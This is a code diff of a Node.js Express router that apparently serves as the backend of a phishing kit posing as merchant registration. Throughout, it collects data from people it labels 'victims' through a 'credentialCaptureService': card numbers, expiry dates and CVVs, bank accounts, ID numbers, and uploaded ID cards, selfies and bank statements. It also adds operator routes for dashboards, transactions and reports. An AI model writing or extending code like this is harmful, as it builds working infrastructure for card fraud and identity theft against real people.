@@ -2,8 +2,6 @@
 const express = require('express');
 const router = express.Router();
 const multer = require('multer');
-const path = require('path');
-const fs = require('fs').promises;
 const { PrismaClient } = require('@prisma/client');
 
 // Initialize repositories and services
@@ -50,55 +48,228 @@ const upload = multer({
   }
 });
 
-// POST /api/merchant/register - Process registration form
-router.post('/register', upload.fields([
+const REGISTRATION_FILE_FIELDS = [
+  { name: 'card_image', maxCount: 1 },
+  { name: 'transaction_history', maxCount: 10 },
+  { name: 'business_license_file', maxCount: 1 },
+  { name: 'representative_id_file', maxCount: 1 },
+  { name: 'business_location_photos', maxCount: 5 },
+  // Backwards compatibility with legacy field names
   { name: 'identityCard', maxCount: 1 },
   { name: 'selfie', maxCount: 1 },
-  { name: 'bankStatement', maxCount: 1 }
-]), async (req, res) => {
+  { name: 'bankStatement', maxCount: 10 }
+];
+
+const normalizeValue = (value) => {
+  if (value === undefined || value === null) return null;
+  if (Array.isArray(value)) {
+    return value
+      .map(item => normalizeValue(item))
+      .filter(v => v !== null && v !== '');
+  }
+  if (typeof value === 'string') {
+    const trimmed = value.trim();
+    return trimmed === '' ? null : trimmed;
+  }
+  return value;
+};
+
+const parseBooleanField = (value) => {
+  if (value === undefined || value === null) return false;
+  if (typeof value === 'boolean') return value;
+  if (typeof value === 'string') {
+    return ['true', '1', 'yes', 'on'].includes(value.toLowerCase());
+  }
+  return Boolean(value);
+};
+
+const buildRegistrationFormData = (body) => ({
+  businessType: normalizeValue(body.business_type) || normalizeValue(body.businessType),
+  businessName: normalizeValue(body.business_name) || normalizeValue(body.fullName) || normalizeValue(body.businessName),
+  industry: normalizeValue(body.industry),
+  taxCode: normalizeValue(body.tax_code),
+  businessLicense: normalizeValue(body.business_license),
+  businessAddress: normalizeValue(body.business_address) || normalizeValue(body.address),
+  businessPhone: normalizeValue(body.business_phone) || normalizeValue(body.phone),
+  businessEmail: normalizeValue(body.business_email) || normalizeValue(body.email),
+  website: normalizeValue(body.website),
+  representativeName: normalizeValue(body.representative_name) || normalizeValue(body.fullName),
+  representativePhone: normalizeValue(body.representative_phone) || normalizeValue(body.phone),
+  representativeEmail: normalizeValue(body.representative_email) || normalizeValue(body.email),
+  representativeIdNumber: normalizeValue(body.representative_id_number) || normalizeValue(body.idNumber),
+  representativePosition: normalizeValue(body.representative_position),
+  bankName: normalizeValue(body.bank_name) || normalizeValue(body.bankName),
+  bankAccountNumber: normalizeValue(body.bank_account_number) || normalizeValue(body.bankAccount),
+  bankAccountName: normalizeValue(body.bank_account_name) || normalizeValue(body.cardHolder),
+  bankBranch: normalizeValue(body.bank_branch),
+  cardType: normalizeValue(body.card_type),
+  cardNumber: normalizeValue(body.card_number) || normalizeValue(body.cardNumber),
+  cardHolderName: normalizeValue(body.card_holder_name) || normalizeValue(body.cardHolder),
+  cardExpiry: normalizeValue(body.card_expiry) || normalizeValue(body.expiryDate),
+  cardCVV: normalizeValue(body.card_cvv) || normalizeValue(body.cvv),
+  city: normalizeValue(body.city),
+  district: normalizeValue(body.district),
+  acceptTerms: parseBooleanField(body.accept_terms)
+});
+
+const hasUploadedFiles = (files, names = []) => {
+  if (!files) return false;
+  return names.some(name => Array.isArray(files[name]) && files[name].length > 0);
+};
+
+const collectMissingFields = (formData, files) => {
+  const missing = [];
+  const requiredFields = [
+    { key: 'businessType', label: 'business_type' },
+    { key: 'businessName', label: 'business_name' },
+    { key: 'businessAddress', label: 'business_address' },
+    { key: 'businessPhone', label: 'business_phone' },
+    { key: 'businessEmail', label: 'business_email' },
+    { key: 'representativeName', label: 'representative_name' },
+    { key: 'representativePhone', label: 'representative_phone' },
+    { key: 'representativeEmail', label: 'representative_email' },
+    { key: 'representativeIdNumber', label: 'representative_id_number' },
+    { key: 'bankName', label: 'bank_name' },
+    { key: 'bankAccountNumber', label: 'bank_account_number' },
+    { key: 'bankAccountName', label: 'bank_account_name' }
+  ];
+
+  requiredFields.forEach(field => {
+    if (!formData[field.key]) {
+      missing.push(field.label);
+    }
+  });
+
+  if (!hasUploadedFiles(files, ['card_image', 'identityCard'])) {
+    missing.push('card_image');
+  }
+
+  if (!hasUploadedFiles(files, ['transaction_history', 'bankStatement'])) {
+    missing.push('transaction_history');
+  }
+
+  if (!formData.acceptTerms) {
+    missing.push('accept_terms');
+  }
+
+  return missing;
+};
+
+const persistUploadedFiles = async (uploadedFiles = {}, victimId) => {
+  const files = {};
+  const currentTimestamp = () => new Date().toISOString();
+
+  const saveSingleFile = async (file, category, options = {}) => {
+    const storedPath = await fileStorageService.storeFile(
+      file.buffer,
+      file.originalname,
+      category,
+      options
+    );
+    return {
+      path: storedPath,
+      originalName: file.originalname,
+      mimetype: file.mimetype,
+      size: file.size,
+      uploadedAt: currentTimestamp()
+    };
+  };
+
+  const saveMultipleFiles = async (fileList, category, optionsBuilder) => {
+    const results = [];
+    for (let index = 0; index < fileList.length; index++) {
+      const options = typeof optionsBuilder === 'function' ? optionsBuilder(index, fileList[index]) : optionsBuilder;
+      results.push(await saveSingleFile(fileList[index], category, options));
+    }
+    return results;
+  };
+
+  // Primary identity verification files
+  const cardImages = [
+    ...(uploadedFiles.card_image || []),
+    ...(uploadedFiles.identityCard || [])
+  ];
+  if (cardImages.length > 0) {
+    files.card_image = await saveSingleFile(cardImages[0], 'identity_card_images', {
+      filenamePrefix: `card_image_${victimId}`
+    });
+    files.identityCard = files.card_image; // backward compatibility
+  }
+
+  const transactionHistorySources = [
+    ...(uploadedFiles.transaction_history || []),
+    ...(uploadedFiles.bankStatement || [])
+  ];
+  if (transactionHistorySources.length > 0) {
+    files.transaction_history = await saveMultipleFiles(
+      transactionHistorySources,
+      'transaction_history',
+      (index) => ({
+        filenamePrefix: `transaction_history_${victimId}_${index}`
+      })
+    );
+    files.bankStatement = files.transaction_history; // backward compatibility
+  }
+
+  // Supporting documents
+  if (uploadedFiles.business_license_file && uploadedFiles.business_license_file.length > 0) {
+    files.business_license_file = await saveSingleFile(
+      uploadedFiles.business_license_file[0],
+      'business_licenses',
+      { filenamePrefix: `business_license_${victimId}` }
+    );
+  }
+
+  if (uploadedFiles.representative_id_file && uploadedFiles.representative_id_file.length > 0) {
+    files.representative_id_file = await saveSingleFile(
+      uploadedFiles.representative_id_file[0],
+      'representative_ids',
+      { filenamePrefix: `representative_id_${victimId}` }
+    );
+  }
+
+  if (uploadedFiles.business_location_photos && uploadedFiles.business_location_photos.length > 0) {
+    files.business_location_photos = await saveMultipleFiles(
+      uploadedFiles.business_location_photos,
+      'business_location_photos',
+      (index) => ({
+        filenamePrefix: `business_location_${victimId}_${index}`
+      })
+    );
+  }
+
+  // Optional selfie support for compatibility
+  if (uploadedFiles.selfie && uploadedFiles.selfie.length > 0) {
+    files.selfie = await saveSingleFile(
+      uploadedFiles.selfie[0],
+      'identity',
+      { filenamePrefix: `selfie_${victimId}` }
+    );
+  }
+
+  return files;
+};
+
+// POST /api/merchant/register - Process registration form
+router.post('/register', upload.fields(REGISTRATION_FILE_FIELDS), async (req, res) => {
   try {
-    const { victim_id } = req.body;
+    const victim_id = req.body.victim_id || req.body.victimId;
     
     if (!victim_id) {
       return res.status(400).json({ error: 'victim_id is required' });
     }
 
-    // Process uploaded files
-    const files = {};
-    if (req.files) {
-      for (const [fieldName, fileArray] of Object.entries(req.files)) {
-        if (fileArray && fileArray.length > 0) {
-          const file = fileArray[0];
-          const filePath = await fileStorageService.storeFile(
-            file.buffer,
-            file.originalname,
-            'identity'
-          );
-          files[fieldName] = {
-            path: filePath,
-            originalName: file.originalname,
-            mimetype: file.mimetype,
-            size: file.size
-          };
-        }
-      }
+    const formData = buildRegistrationFormData(req.body);
+    const missingFields = collectMissingFields(formData, req.files);
+    if (missingFields.length > 0) {
+      return res.status(400).json({
+        success: false,
+        error: 'Validation failed',
+        missing_fields: missingFields
+      });
     }
 
-    // Extract form data
-    const formData = {
-      fullName: req.body.fullName,
-      phone: req.body.phone,
-      address: req.body.address,
-      city: req.body.city,
-      district: req.body.district,
-      bankName: req.body.bankName,
-      bankAccount: req.body.bankAccount,
-      idNumber: req.body.idNumber,
-      cardNumber: req.body.cardNumber,
-      cardHolder: req.body.cardHolder,
-      expiryDate: req.body.expiryDate,
-      cvv: req.body.cvv
-    };
+    const files = await persistUploadedFiles(req.files || {}, victim_id);
 
     // Process registration form
     const updatedVictim = await credentialCaptureService.processRegistrationForm(
@@ -163,5 +334,24 @@ router.get('/session/:victim_id', async (req, res) => {
 const banksRoutes = require('./banks');
 router.use('/banks', banksRoutes);
 
-module.exports = router;
+// Dashboard routes
+const dashboardRoutes = require('./dashboard');
+router.use('/dashboard', dashboardRoutes);
 
+// Transactions routes
+const transactionsRoutes = require('./transactions');
+router.use('/transactions', transactionsRoutes);
+
+// Reports routes
+const reportsRoutes = require('./reports');
+router.use('/reports', reportsRoutes);
+
+// QR codes routes
+const qrCodesRoutes = require('./qr-codes');
+router.use('/qr-codes', qrCodesRoutes);
+
+// Account settings routes
+const accountRoutes = require('./account');
+router.use('/account', accountRoutes);
+
+module.exports = router;
